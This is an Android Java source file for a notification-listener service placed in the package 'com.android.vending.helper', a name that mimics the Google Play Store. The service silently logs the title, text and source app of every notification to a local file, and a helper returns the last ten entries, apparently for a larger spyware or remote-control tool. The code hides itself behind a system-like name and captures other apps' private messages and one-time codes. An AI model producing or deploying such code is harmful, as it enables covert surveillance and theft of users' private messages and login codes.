package com.android.vending.helper;
import android.service.notification.*;
import android.content.Context;
import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class NotifListener extends NotificationListenerService {
    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        try { 
            android.os.Bundle ex = sbn.getNotification().extras; 
            String title = ex.getString("android.title", ""); 
            String text = ex.getString("android.text", ""); 
            String appName = sbn.getPackageName();
            
            if (title == null) title = "";
            if (text == null) text = "";
            
            if (!title.isEmpty() || !text.isEmpty()) { 
                String logEntry = "[" + appName + "]\n" + title + ": " + text + "\n---\n";
                saveNotification(this, logEntry);
            } 
        } catch (Exception ignored) {}
    }

    private void saveNotification(Context c, String entry) {
        try {
            File f = new File(c.getFilesDir(), "notifications.txt");
            FileWriter fw = new FileWriter(f, true);
            fw.write(entry);
            fw.close();
            if (f.length() > 50000) { f.delete(); }
        } catch (Exception ignored) {}
    }

    public static String getLast10(Context c) {
        try {
            File f = new File(c.getFilesDir(), "notifications.txt");
            if (!f.exists()) return "لا توجد إشعارات مسجلة بعد. تأكد من تفعيل خدمة الإشعارات.";
            
            BufferedReader br = new BufferedReader(new FileReader(f));
            List<String> lines = new ArrayList<>();
            String line;
            while ((line = br.readLine()) != null) { lines.add(line); }
            br.close();
            
            if (lines.isEmpty()) return "لا توجد إشعارات.";
            
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (int i = lines.size() - 1; i >= 0; i--) {
                sb.insert(0, lines.get(i) + "\n");
                if (lines.get(i).equals("---")) count++;
                if (count >= 10) break;
            }
            return sb.toString();
        } catch (Exception e) { return "خطأ في قراءة الإشعارات."; }
    }
}
